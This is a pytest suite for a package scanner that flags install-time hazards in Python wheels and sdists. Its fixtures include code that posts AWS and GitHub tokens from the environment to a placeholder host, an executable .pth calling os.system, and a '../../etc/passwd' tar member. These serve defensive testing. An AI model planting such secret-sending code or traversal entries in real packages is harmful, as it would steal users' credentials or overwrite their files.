from __future__ import annotations

import io
import tarfile
from pathlib import Path

import pytest

from devpi_guardian.analyzers import scan_install_surface


def _rules(findings):
    return {item.rule for item in findings}


def _deny(findings):
    return [item for item in findings if item.action == "DENY"]


def test_setup_py_subprocess_is_denied(make_sdist) -> None:
    artifact = make_sdist(
        {
            "setup.py": (
                "import subprocess\nfrom setuptools import setup\n"
                "subprocess.run(['echo', 'blocked'])\nsetup()\n"
            ),
            "demo/__init__.py": "",
        }
    )
    findings = scan_install_surface(str(artifact))
    assert "setup_py_process" in _rules(findings)
    assert any(item.action == "DENY" for item in findings)


def test_setup_network_cmdclass_and_file_write_rules(make_sdist) -> None:
    artifact = make_sdist(
        {
            "setup.py": (
                "from setuptools import setup\n"
                "import requests\n"
                "requests.get('http://127.0.0.1:1/')\n"
                "open('generated.txt', 'w').write('x')\n"
                "setup(cmdclass={'install': object})\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    assert {
        "setup_py_network",
        "setup_py_cmdclass",
        "setup_py_file_write",
    } <= _rules(findings)


def test_setup_network_values_and_constructors_are_not_network_findings(make_sdist) -> None:
    artifact = make_sdist(
        {
            "setup.py": (
                "import httpx\n"
                "from requests import Response\n"
                "httpx.URL('https://example.test')\n"
                "Response()\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    assert "setup_py_network" not in _rules(findings)


def test_executable_pth_is_denied(make_wheel) -> None:
    artifact = make_wheel({"demo.pth": "import os; os.system('echo blocked')\n"})
    findings = scan_install_surface(str(artifact))
    assert "executable_pth" in _rules(findings)
    assert _deny(findings)


def test_init_credential_to_network_flow_is_denied(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo/__init__.py": (
                "import os\n"
                "import requests\n"
                "token = os.environ['AWS_SECRET_ACCESS_KEY']\n"
                "requests.post('http://127.0.0.1:1/', data=token)\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    flow = [
        item
        for item in findings
        if item.rule == "init_top_level_side_effect" and item.action == "DENY"
    ]
    assert flow
    assert flow[0].source == "os.environ['AWS_SECRET_ACCESS_KEY']"
    assert flow[0].sink == "requests.post"


def test_safe_wrapper_does_not_hide_init_credential_network_flow(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo/__init__.py": (
                "import os\n"
                "import requests\n"
                "import typing\n"
                "typing.cast(str, requests.post(\n"
                "    'http://127.0.0.1:1/', data=os.getenv('GITHUB_TOKEN')\n"
                "))\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    flow = [
        item
        for item in findings
        if item.rule == "init_top_level_side_effect" and item.action == "DENY"
    ]
    assert flow
    assert flow[0].sink == "requests.post"


def test_init_one_helper_credential_flow_is_denied(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo/__init__.py": (
                "import os\n"
                "import requests\n"
                "def send(value):\n"
                "    requests.post('http://127.0.0.1:1/', data=value)\n"
                "token = os.getenv('GITHUB_TOKEN')\n"
                "send(token)\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    flow = [
        item
        for item in findings
        if item.rule == "init_top_level_side_effect" and item.action == "DENY"
    ]
    assert flow
    assert flow[0].line == 4
    assert flow[0].source == "os.getenv('GITHUB_TOKEN')"
    assert flow[0].sink == "requests.post"


def test_init_helper_returning_credential_is_denied(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo/__init__.py": (
                "import os\n"
                "import requests\n"
                "def load_token():\n"
                "    return os.getenv('GITHUB_TOKEN')\n"
                "token = load_token()\n"
                "requests.post('http://127.0.0.1:1/', data=token)\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    flow = [item for item in findings if item.action == "DENY" and item.sink]
    assert flow
    assert flow[0].source == "os.getenv('GITHUB_TOKEN')"
    assert flow[0].sink == "requests.post"


def test_path_traversal_archive_is_denied(tmp_path: Path) -> None:
    artifact = tmp_path / "traversal.tar.gz"
    payload = b"blocked"
    member = tarfile.TarInfo("../../etc/passwd")
    member.size = len(payload)
    with tarfile.open(artifact, "w:gz") as archive:
        archive.addfile(member, io.BytesIO(payload))

    findings = scan_install_surface(str(artifact))
    assert "archive_unsafe_member" in _rules(findings)
    assert _deny(findings)


def test_sitecustomize_is_denied(make_wheel) -> None:
    artifact = make_wheel({"sitecustomize.py": "VALUE = 1\n"})
    findings = scan_install_surface(str(artifact))
    assert "customize_module" in _rules(findings)
    assert _deny(findings)


@pytest.mark.parametrize(
    "relpath",
    ["demo-1.0.0.data/purelib/sitecustomize.py", "demo-1.0.0.data/platlib/usercustomize.py"],
)
def test_wheel_relocation_root_customize_is_denied(make_wheel, relpath: str) -> None:
    artifact = make_wheel({relpath: "VALUE = 1\n"})
    findings = scan_install_surface(str(artifact))
    assert "customize_module" in _rules(findings)
    assert _deny(findings)


def test_wheel_nested_customize_data_is_not_denied(make_wheel) -> None:
    artifact = make_wheel({"pdm/pep582/sitecustomize.py": "VALUE = 1\n"})
    assert "customize_module" not in _rules(scan_install_surface(str(artifact)))


def test_sdist_common_root_customize_is_denied(make_sdist) -> None:
    artifact = make_sdist({"sitecustomize.py": "VALUE = 1\n", "demo/__init__.py": ""})
    findings = scan_install_surface(str(artifact))
    assert "customize_module" in _rules(findings)
    assert _deny(findings)


def test_sdist_src_layout_customize_is_denied(make_sdist) -> None:
    artifact = make_sdist({"src/usercustomize.py": "VALUE = 1\n", "src/demo/__init__.py": ""})
    findings = scan_install_surface(str(artifact))
    assert "customize_module" in _rules(findings)
    assert _deny(findings)


def test_zip_sdist_common_root_src_customize_is_denied(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo-1.0.0/src/sitecustomize.py": "VALUE = 1\n",
            "demo-1.0.0/demo/__init__.py": "",
        },
        name="demo-1.0.0.zip",
    )
    findings = scan_install_surface(str(artifact))
    assert "customize_module" in _rules(findings)
    assert _deny(findings)


def test_sdist_nested_customize_data_is_not_denied(make_sdist) -> None:
    artifact = make_sdist({"pdm/pep582/sitecustomize.py": "VALUE = 1\n"})
    assert "customize_module" not in _rules(scan_install_surface(str(artifact)))


def test_sdist_without_single_common_root_does_not_treat_nested_file_as_root(
    make_sdist,
) -> None:
    artifact = make_sdist(
        {"demo/sitecustomize.py": "VALUE = 1\n", "other/data.txt": "VALUE = 1\n"},
        prefix=None,
    )
    assert "customize_module" not in _rules(scan_install_surface(str(artifact)))


def test_plain_pure_python_package_has_no_deny(make_sdist) -> None:
    artifact = make_sdist(
        {
            "setup.py": "from setuptools import setup\nsetup(name='demo')\n",
            "demo/__init__.py": "VALUE = 1\n",
            "demo/core.py": "def add(a, b):\n    return a + b\n",
        }
    )
    assert _deny(scan_install_surface(str(artifact))) == []


def test_safe_init_constructs_have_no_deny(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo/__init__.py": (
                "import logging\n"
                "__version__ = '1.0'\n"
                "__all__ = ['value']\n"
                "logger = logging.getLogger(__name__)\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    assert findings == []


def test_normal_console_script_is_review_not_deny(make_sdist) -> None:
    artifact = make_sdist(
        {
            "setup.cfg": (
                "[metadata]\nname = demo\n"
                "[options.entry_points]\n"
                "console_scripts =\n    demo = demo.cli:main\n"
            ),
            "demo/__init__.py": "",
            "demo/cli.py": "def main():\n    return 0\n",
        }
    )
    findings = scan_install_surface(str(artifact))
    assert "entry_point" in _rules(findings)
    assert _deny(findings) == []


def test_comments_and_docstrings_do_not_trigger_deny(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo/__init__.py": (
                "'''subprocess.run and os.system are documentation text'''\n"
                "# requests.post('not called')\n"
                "__version__ = '1.0'\n"
            )
        }
    )
    assert scan_install_surface(str(artifact)) == []


def test_hatchling_backend_is_known_and_allowed(make_sdist) -> None:
    artifact = make_sdist(
        {
            "pyproject.toml": (
                "[build-system]\n"
                "requires = ['hatchling>=1.25']\n"
                "build-backend = 'hatchling.build'\n"
            ),
            "demo/__init__.py": "",
        }
    )
    findings = scan_install_surface(str(artifact))
    assert "nonstandard_build_backend" not in _rules(findings)
    assert "unknown_build_requirement" not in _rules(findings)
    assert _deny(findings) == []


def test_nonstandard_backend_and_unknown_build_requirement_are_review(
    make_sdist,
) -> None:
    artifact = make_sdist(
        {
            "pyproject.toml": (
                "[build-system]\n"
                "requires = ['mystery-builder>=1']\n"
                "build-backend = 'mystery.backend'\n"
            )
        }
    )
    findings = scan_install_surface(str(artifact))
    assert {
        "nonstandard_build_backend",
        "unknown_build_requirement",
    } <= _rules(findings)
    assert _deny(findings) == []


def test_native_and_executable_package_data_are_review(make_wheel) -> None:
    artifact = make_wheel(
        {"demo/native.so": b"not-real", "demo/tool": b"#!/bin/sh\n"},
        modes={"demo/tool": 0o755},
    )
    findings = scan_install_surface(str(artifact))
    assert "native_or_executable" in _rules(findings)
    assert _deny(findings) == []


def test_results_are_deterministic(make_wheel) -> None:
    artifact = make_wheel(
        {
            "demo.pth": "import os\n",
            "sitecustomize.py": "VALUE = 1\n",
            "demo/__init__.py": "print('review')\n",
        }
    )
    first = scan_install_surface(str(artifact))
    second = scan_install_surface(str(artifact))
    assert first == second
